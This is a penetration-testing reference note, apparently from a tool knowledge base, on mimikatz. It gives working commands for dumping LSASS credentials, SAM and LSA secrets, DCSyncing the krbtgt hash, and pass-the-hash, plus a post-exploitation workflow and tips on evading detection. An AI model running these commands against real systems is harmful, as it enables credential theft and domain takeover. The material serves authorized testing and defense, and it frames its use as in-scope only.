---
tool: mimikatz
slug: mimikatz
stages: [actions-on-objectives]
category: Windows credential dumping
platforms: [windows]
services: []
ports: []
tags: [credentials, lsass, pass-the-hash, dcsync, tickets, active-directory]
attack: [T1003.001, T1003.006, T1550.002, T1558.001]
summary: The credential toolkit on Windows. Pull plaintext, hashes and Kerberos tickets from LSASS, dump the local SAM, DCSync a hash straight from a domain controller, and pass or forge tickets. Reach for it once you have admin on a Windows host.
references:
  - mimikatz wiki | https://github.com/gentilkiwi/mimikatz/wiki
---

## When to reach for it

You have local admin (or SYSTEM) on a Windows box and want the credentials on it: the logged-on users' secrets, the local account hashes, or a domain hash you can pull from the DC. mimikatz reads them from memory and the registry. On a domain controller or with replication rights it will DCSync any account's hash without touching LSASS.

## Key flags

mimikatz runs its own command modules, not flags:

- `privilege::debug`: take SeDebugPrivilege; needed before touching LSASS.
- `token::elevate`: raise to SYSTEM when a module needs it.
- `sekurlsa::logonpasswords`: plaintext, NTLM and tickets for logged-on users.
- `sekurlsa::ekeys`: Kerberos encryption keys (AES) from memory.
- `lsadump::sam`: local SAM account hashes.
- `lsadump::dcsync`: pull an account's hash from a DC over replication.
- `sekurlsa::pth`: pass-the-hash, spawn a process as another user from their NTLM.

## Commands

Dump logged-on credentials from LSASS:

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

Local SAM hashes, and the LSA secrets that hold service-account passwords:

```text
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
```

DCSync a domain hash (needs replication rights, i.e. Domain Admin or equivalent):

```text
mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt
```

Pass-the-hash to open a shell as another user without their password:

```text
mimikatz # sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

## Workflow

1. Confirm you are admin or SYSTEM on the host; run `privilege::debug` first.
2. `sekurlsa::logonpasswords` for anyone logged on; note hashes and any plaintext.
3. `lsadump::sam` and `lsadump::secrets` for local and service-account secrets.
4. With domain replication rights, `dcsync` the `krbtgt` and target accounts.
5. Reuse what you found: pass-the-hash here, or crack and spray elsewhere.

## Notes

mimikatz is heavily signatured, so AV and EDR flag the binary on sight; in practice its functions are often run through another tool (netexec modules, or the Meterpreter `kiwi` extension in the [Metasploit](#tool-metasploit) note) or from memory. DCSync needs replication rights and pulling `krbtgt` enables golden tickets, so treat both as high-impact actions to clear with the client. Everything here is in-scope-only, and harvested credentials and tickets are sensitive loot: record where each came from and handle it with the rest of the engagement data.
